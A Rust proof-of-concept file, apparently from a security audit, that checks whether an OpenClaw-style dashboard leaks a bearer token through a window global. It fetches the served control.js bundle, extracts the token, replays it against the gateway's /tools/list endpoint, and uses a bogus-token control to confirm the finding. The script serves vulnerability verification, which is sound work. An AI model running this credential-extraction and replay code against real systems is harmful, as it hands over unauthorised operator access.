// F2 - JS bridge token forgery.
//
// Hypothesis: the dashboard ships a bearer credential into page context under a
// well-known global (`window.__OPENCLAW_NATIVE_BROWSER_TOKEN__`), so any script
// running on that origin - for example an injected one - can read it and replay
// it against the gateway API.
//
// How this is tested without a browser: the script the dashboard loads is
// fetched over HTTP, and the credential is recovered from the served source the
// same way injected JavaScript would recover it from `window`. The recovered
// value is then replayed as an HTTP bearer credential.
//
// The earlier version of this file always failed, because it replayed a
// hard-coded placeholder string. It now extracts the real value, and it keeps
// the guard that a wrong credential must be refused.
//
// Build:  rustc F2.rs -o F2
// Run:    ./F2 [--host 127.0.0.1] [--port 18789] [--json]

#![allow(dead_code, unused_imports)]

include!("poc_support.rs");

const GLOBAL: &str = "__OPENCLAW_NATIVE_BROWSER_TOKEN__";

/// Recover the value assigned to the named global in served JavaScript.
fn extract_global(source: &str, name: &str) -> Option<String> {
    for line in source.lines() {
        let Some(pos) = line.find(name) else { continue };
        let rest = &line[pos + name.len()..];
        let Some(eq) = rest.find('=') else { continue };
        let value = rest[eq + 1..].trim().trim_end_matches(';').trim();
        for quote in ['"', '\''] {
            if let Some(stripped) = value.strip_prefix(quote) {
                if let Some(end) = stripped.find(quote) {
                    let token = &stripped[..end];
                    if !token.is_empty() {
                        return Some(token.to_string());
                    }
                }
            }
        }
    }
    None
}

fn main() {
    let args = Args::parse();
    let mut report = Report::new("F2", "JS bridge token forgery");
    if !args.json {
        banner("F2", "JS bridge token forgery");
        println!("    target: {}", args.addr());
    }

    // 1. Fetch the script the dashboard loads - what an injected script would
    //    have access to simply by being on the page.
    let bundle = match get(&args.host, args.port, "/assets/control.js") {
        Some(r) if r.status == 200 => r.body,
        Some(r) => {
            report.note(format!("control bundle returned HTTP {}", r.status));
            report.finish(args.json, 3);
        }
        None => {
            report.note(format!("no HTTP response from {}", args.addr()));
            report.finish(args.json, 3);
        }
    };
    report.evidence(format!(
        "fetched control bundle ({} bytes)",
        bundle.len()
    ));

    let token = match extract_global(&bundle, GLOBAL) {
        Some(t) => t,
        None => {
            report.note(format!(
                "no credential assigned to window.{GLOBAL} in the served bundle"
            ));
            report.note(
                "nothing in page context could be stolen, so token forgery is not possible here",
            );
            report.finish(args.json, 1);
        }
    };
    let shown = if token.len() > 6 {
        format!("{}...{} ({} chars)", &token[..3], &token[token.len() - 3..], token.len())
    } else {
        format!("({} chars)", token.len())
    };
    report.evidence(format!("recovered window.{GLOBAL} = {shown}"));

    // 2. Replay it exactly as injected JavaScript would.
    let replay = get_bearer(&args.host, args.port, "/tools/list", &token);
    let replay_status = replay.as_ref().map(|r| r.status).unwrap_or(0);
    report.evidence(format!("replay on /tools/list -> HTTP {replay_status}"));

    // 3. Control: a forged value must be refused.
    let bogus = get_bearer(&args.host, args.port, "/tools/list", "XSS_EXTRACTED_TOKEN");
    let bogus_status = bogus.as_ref().map(|r| r.status).unwrap_or(0);
    report.evidence(format!("control with the old placeholder -> HTTP {bogus_status}"));

    if bogus_status == 200 {
        report.note("the forged placeholder was also accepted, so the target ignores credentials");
        report.finish(args.json, 2);
    }

    if replay_status == 200 {
        report.evidence("the credential exposed to page context is accepted by the HTTP API");
        report.note("any XSS on the dashboard origin inherits full operator access");
        report.confirmed = true;
        report.finish(args.json, 0);
    }

    report.note(format!(
        "the recovered value was rejected (HTTP {replay_status}); exposure in page context \
         does not yield API access on this target"
    ));
    report.finish(args.json, 1);
}
